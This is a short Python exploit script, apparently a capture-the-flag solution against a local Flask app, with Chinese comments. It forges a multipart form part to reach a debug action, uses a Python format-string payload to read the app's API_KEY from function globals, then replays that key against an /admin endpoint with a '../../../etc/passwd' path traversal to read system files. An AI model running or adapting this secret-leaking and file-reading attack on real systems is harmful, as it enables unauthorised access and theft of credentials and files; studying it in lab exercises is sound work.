import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 每次都重新获取 API_KEY
api_key = format_string_leak("{0.view_functions[action].__globals__[API_KEY]}")
print(f"[+] API_KEY: {api_key}")

# 测试
headers = {"Authorization": api_key}

# 先测试基础的
print("\n[*] Testing index.html...")
r = httpx.get(f"{TARGET}/admin", params={"tmpl": "index.html"}, headers=headers, timeout=5.0)
print(f"Status: {r.status_code}, Content: {r.text[:100]}")

# 测试 /etc/passwd
print("\n[*] Testing /etc/passwd...")
r = httpx.get(f"{TARGET}/admin", params={"tmpl": "../../../etc/passwd"}, headers=headers, timeout=5.0)
print(f"Status: {r.status_code}, Content: {r.text[:200]}")

# 测试没有 header
print("\n[*] Testing without Authorization...")
r = httpx.get(f"{TARGET}/admin", params={"tmpl": "index.html"}, timeout=5.0)
print(f"Status: {r.status_code}, Content: {r.text[:100]}")
